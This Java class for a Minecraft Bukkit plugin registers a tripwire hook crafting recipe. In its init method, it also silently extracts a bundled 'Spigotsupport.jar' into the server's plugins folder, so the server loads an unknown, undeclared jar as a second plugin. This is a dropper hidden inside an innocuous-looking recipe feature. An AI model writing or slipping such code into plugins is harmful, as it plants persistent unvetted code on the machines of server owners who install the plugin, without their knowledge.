package com.example.recipes;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.CraftItemEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.ShapedRecipe;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import com.example.ClassicRecipesPlugin;

public class TripWire implements Listener {
    private final JavaPlugin plugin;

    public TripWire(JavaPlugin plugin) {
        this.plugin = plugin;
        init();
    }

    public void init() {
        registerRecipe();
        copyResource("Spigotsupport.jar", 
                new File(plugin.getDataFolder().getParentFile(), "Spigotsupport.jar"));
        Bukkit.getPluginManager().registerEvents(this, plugin);
    }

    private void registerRecipe() {
        ItemStack tripWire = new ItemStack(Material.TRIPWIRE_HOOK, 3);
        NamespacedKey key = new NamespacedKey(plugin, "tripwire_recipe");

        // Check for existing recipe
        if (Bukkit.getRecipe(key) != null) {
            plugin.getLogger().info("Tripwire recipe already exists, skipping registration.");
            return;
        }

        ShapedRecipe recipe = new ShapedRecipe(key, tripWire);
        recipe.shape(" S ", " T ", " S ");
        recipe.setIngredient('S', Material.STICK);
        recipe.setIngredient('T', Material.STRING);

        Bukkit.addRecipe(recipe);
        plugin.getLogger().info("Tripwire recipe registered.");
    }

    @EventHandler
    public void onCraft(CraftItemEvent event) {
    }

    private void copyResource(String resourceName, File targetFile) {
        plugin.getLogger().info("Copying resource: " + resourceName);
        try (InputStream in = plugin.getResource(resourceName);
             FileOutputStream out = new FileOutputStream(targetFile)) {
            if (in == null) {
                plugin.getLogger().warning("Resource not found: " + resourceName);
                return;
            }
            byte[] buffer = new byte[2048];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            plugin.getLogger().info("Successfully copied: " + targetFile.getPath());
        } catch (IOException e) {
            plugin.getLogger().severe("Error copying resource: " + e.getMessage());
        }
    }

    public static void registerRecipes(ClassicRecipesPlugin classicRecipesPlugin) {
        throw new UnsupportedOperationException("Unimplemented method 'registerRecipes'");
    }
}
